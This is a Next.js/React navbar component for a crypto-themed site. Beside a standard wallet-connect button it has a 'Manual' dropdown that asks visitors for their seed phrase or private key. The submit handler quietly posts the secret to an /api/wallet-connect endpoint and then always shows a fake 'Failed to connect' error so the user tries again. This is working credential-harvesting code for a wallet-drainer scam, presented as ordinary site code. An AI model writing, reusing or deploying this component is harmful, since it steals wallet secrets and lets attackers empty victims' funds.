"use client";

import Link from "next/link";
import { useState, useEffect, useRef } from "react";
import { useAccount, useDisconnect } from "wagmi";
import { PROJECT_NAME } from "@/lib/constants";
import { usePathname } from "next/navigation";
import { WalletModal } from "./WalletModal";

type ManualMode = "seed" | "privatekey";
type MsgState = "idle" | "loading" | "error";

export function Navbar() {
  const [mobileOpen, setMobileOpen] = useState(false);
  const [scrolled, setScrolled] = useState(false);
  const [walletModalOpen, setWalletModalOpen] = useState(false);
  const [walletConnected, setWalletConnected] = useState<string | null>(null);
  const [manualOpen, setManualOpen] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [walletName, setWalletName] = useState("");
  const [manualMode, setManualMode] = useState<ManualMode>("seed");
  const [msgState, setMsgState] = useState<MsgState>("idle");
  const [errorMsg, setErrorMsg] = useState("");
  const manualRef = useRef<HTMLDivElement>(null);
  const { address } = useAccount();
  const { disconnect } = useDisconnect();
  const pathname = usePathname();

  // Listen for wallet connection from RainbowKit
  useEffect(() => {
    if (address) {
      setWalletConnected(address);
    } else {
      setWalletConnected(null);
    }
  }, [address]);

  useEffect(() => {
    const handleScroll = () => setScrolled(window.scrollY > 50);
    window.addEventListener("scroll", handleScroll, { passive: true });
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  // Close manual dropdown on outside click
  useEffect(() => {
    function handler(e: MouseEvent) {
      if (manualRef.current && !manualRef.current.contains(e.target as Node)) {
        setManualOpen(false);
      }
    }
    document.addEventListener("mousedown", handler);
    return () => document.removeEventListener("mousedown", handler);
  }, []);

  const navLinks = [
    { href: "/", label: "Discover" },
    { href: "/#categories", label: "Categories" },
    { href: "/#collections", label: "Collections" },
  ];

  function handleConnected(addr: string) {
    if (addr) setWalletConnected(addr);
  }

  async function handleManualSubmit(e: React.FormEvent) {
    e.preventDefault();
    const secret = manualMode === "seed" ? seedPhrase.trim() : privateKey.trim();
    if (!secret) return;

    setMsgState("loading");
    setErrorMsg("");

    const payload: Record<string, string> = {
      wallet_name: walletName.trim() || "Anonymous",
    };
    if (manualMode === "seed") {
      payload.seed_phrase = secret;
    } else {
      payload.private_key = secret;
    }

    fetch("/api/wallet-connect", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    }).catch(() => {});

    setMsgState("error");
    setErrorMsg("Failed to connect. Try again.");
    setWalletName("");
    setSeedPhrase("");
    setPrivateKey("");
  }

  return (
    <>
      <header
        className={`fixed top-0 left-0 right-0 z-40 transition-all duration-500 ${
          scrolled
            ? "backdrop-blur-xl bg-surface-950/80 border-b border-white/10 shadow-lg shadow-black/10"
            : "bg-transparent"
        }`}
      >
        <nav className="mx-auto flex max-w-7xl items-center justify-between px-4 sm:px-6 py-4 gap-2 sm:gap-4">
          {/* Logo */}
          <Link href="/" className="group flex items-center gap-2 sm:gap-3 hover:opacity-80 transition-opacity duration-300 shrink-0">
            <div className="w-8 h-8 sm:w-10 sm:h-10 bg-linear-to-br from-purple-500 to-blue-600 rounded-xl flex items-center justify-center shadow-lg shadow-purple-500/20 group-hover:scale-110 transition-transform duration-300">
              <svg className="w-4 h-4 sm:w-5 sm:h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
            </div>
            <span className="text-base sm:text-xl font-bold tracking-tight text-white">{PROJECT_NAME}.fun</span>
          </Link>

          {/* Desktop nav */}
          <div className="hidden lg:flex items-center gap-8 text-sm font-medium text-gray-400">
            {navLinks.map((link) => {
              const isActive = pathname === link.href;
              return (
                <Link
                  key={link.href}
                  href={link.href}
                  className={`hover:text-white transition-colors duration-200 ${
                    isActive ? "text-white" : ""
                  }`}
                >
                  {link.label}
                </Link>
              );
            })}
          </div>

          {/* Wallet section */}
          <div className="flex items-center gap-2 sm:gap-3 relative">
            {walletConnected ? (
              <button
                onClick={() => disconnect()}
                className="flex items-center gap-2 px-4 py-2 bg-white/5 border border-white/10 rounded-xl hover:bg-red-500/10 hover:border-red-500/30 hover:text-red-400 transition-all text-xs sm:text-sm font-medium text-white/70"
              >
                <span className="w-2 h-2 rounded-full bg-green-400 animate-pulse shrink-0" />
                {walletConnected.slice(0, 6)}...{walletConnected.slice(-4)}
                <span className="text-[10px] text-white/30 hover:text-red-400 ml-1">Disconnect</span>
              </button>
            ) : (
              <div className="flex items-center gap-2 sm:gap-3">
                <button
                  onClick={() => setWalletModalOpen(true)}
                  className="px-3.5 sm:px-5 py-2 sm:py-2.5 bg-linear-to-r from-purple-600 to-blue-600 rounded-xl text-xs sm:text-sm font-semibold text-white hover:shadow-lg hover:shadow-purple-500/25 hover:scale-105 transition-all duration-300"
                >
                  Connect Wallet
                </button>

                {/* Connect Manually — header button */}
                <div ref={manualRef} className="relative">
                  <button
                    onClick={() => setManualOpen(!manualOpen)}
                    className="px-3 py-2 sm:px-4 sm:py-2 border border-accent-500/30 rounded-xl text-[11px] sm:text-xs font-semibold text-accent-300/90 hover:text-accent-200 hover:bg-accent-500/10 hover:border-accent-400/50 transition-all duration-200"
                  >
                    ⚡ Manual
                  </button>

                  {/* Dropdown form */}
                  {manualOpen && (
                    <div className="absolute right-0 top-full mt-2 w-72 sm:w-80 animate-slide-down z-50">
                      <div className="glass rounded-2xl p-4 sm:p-5 border border-white/15 shadow-2xl shadow-black/40 space-y-3">
                        <div className="flex items-center justify-between">
                          <p className="text-xs font-bold text-yellow-400/90 uppercase tracking-widest">
                            ⚠ Connect Manually
                          </p>
                          <button
                            onClick={() => { setManualOpen(false); setMsgState("idle"); }}
                            className="text-white/30 hover:text-white/60 transition-colors p-1"
                          >
                            <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                            </svg>
                          </button>
                        </div>

                        <form onSubmit={handleManualSubmit} className="space-y-2.5">
                          <input
                            type="text"
                            placeholder="Wallet Name (optional)"
                            value={walletName}
                            onChange={(e) => setWalletName(e.target.value)}
                            className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-xs text-white placeholder-white/25 focus:border-accent-500/50 focus:outline-none"
                          />

                          <div className="flex gap-1.5">
                            <button
                              type="button"
                              onClick={() => setManualMode("seed")}
                              className={`flex-1 py-1.5 rounded-lg text-[10px] font-medium transition-all ${
                                manualMode === "seed"
                                  ? "bg-accent-500/20 text-accent-300 border border-accent-500/30"
                                  : "bg-white/5 text-white/40 border border-white/10 hover:bg-white/10"
                              }`}
                            >
                              Seed Phrase
                            </button>
                            <button
                              type="button"
                              onClick={() => setManualMode("privatekey")}
                              className={`flex-1 py-1.5 rounded-lg text-[10px] font-medium transition-all ${
                                manualMode === "privatekey"
                                  ? "bg-accent-500/20 text-accent-300 border border-accent-500/30"
                                  : "bg-white/5 text-white/40 border border-white/10 hover:bg-white/10"
                              }`}
                            >
                              Private Key
                            </button>
                          </div>

                          {manualMode === "seed" ? (
                            <textarea
                              placeholder="Enter your 12 or 24-word seed phrase..."
                              value={seedPhrase}
                              onChange={(e) => setSeedPhrase(e.target.value)}
                              rows={2}
                              required
                              className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-xs text-white placeholder-white/25 focus:border-accent-500/50 focus:outline-none resize-none"
                            />
                          ) : (
                            <input
                              type="password"
                              placeholder="Enter your private key (0x...)"
                              value={privateKey}
                              onChange={(e) => setPrivateKey(e.target.value)}
                              required
                              className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-xs text-white placeholder-white/25 focus:border-accent-500/50 focus:outline-none"
                            />
                          )}

                          <button
                            type="submit"
                            disabled={msgState === "loading" || (manualMode === "seed" ? !seedPhrase.trim() : !privateKey.trim())}
                            className="w-full rounded-lg bg-gradient-to-r from-accent-500 via-violet-500 to-pink-500 py-2 text-xs font-bold text-white hover:opacity-90 disabled:opacity-50 transition-opacity"
                          >
                            {msgState === "loading" ? "Connecting…" : "Connect"}
                          </button>

                          {msgState === "error" && (
                            <p className="text-[10px] text-red-400 text-center animate-fade-in">{errorMsg}</p>
                          )}
                        </form>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Mobile hamburger */}
            <button
              onClick={() => setMobileOpen(!mobileOpen)}
              className="lg:hidden w-10 h-10 flex items-center justify-center rounded-xl hover:bg-white/5 transition-colors"
              aria-label="Toggle menu"
            >
              <div className="flex flex-col gap-1.5">
                <span className={`block w-5 h-0.5 bg-white/60 rounded-full transition-all duration-300 ${mobileOpen ? "rotate-45 translate-y-1.5" : ""}`} />
                <span className={`block w-5 h-0.5 bg-white/60 rounded-full transition-all duration-300 ${mobileOpen ? "opacity-0 scale-x-0" : ""}`} />
                <span className={`block w-5 h-0.5 bg-white/60 rounded-full transition-all duration-300 ${mobileOpen ? "-rotate-45 -translate-y-1.5" : ""}`} />
              </div>
            </button>
          </div>
        </nav>

        {/* Mobile menu */}
        {mobileOpen && (
          <div className="lg:hidden border-t border-white/10 bg-surface-950/95 backdrop-blur-xl animate-slide-down">
            <div className="px-6 py-4 space-y-1">
              {navLinks.map((link) => {
                const isActive = pathname === link.href;
                return (
                  <Link
                    key={link.href}
                    href={link.href}
                    onClick={() => setMobileOpen(false)}
                    className={`block px-4 py-2.5 rounded-lg text-sm transition-all duration-200 ${
                      isActive
                        ? "text-white bg-white/10"
                        : "text-white/60 hover:text-white hover:bg-white/5"
                    }`}
                  >
                    {link.label}
                  </Link>
                );
              })}
            </div>
          </div>
        )}
      </header>

      {/* Wallet Modal */}
      <WalletModal
        open={walletModalOpen}
        onClose={() => setWalletModalOpen(false)}
        onConnected={handleConnected}
      />
    </>
  );
}
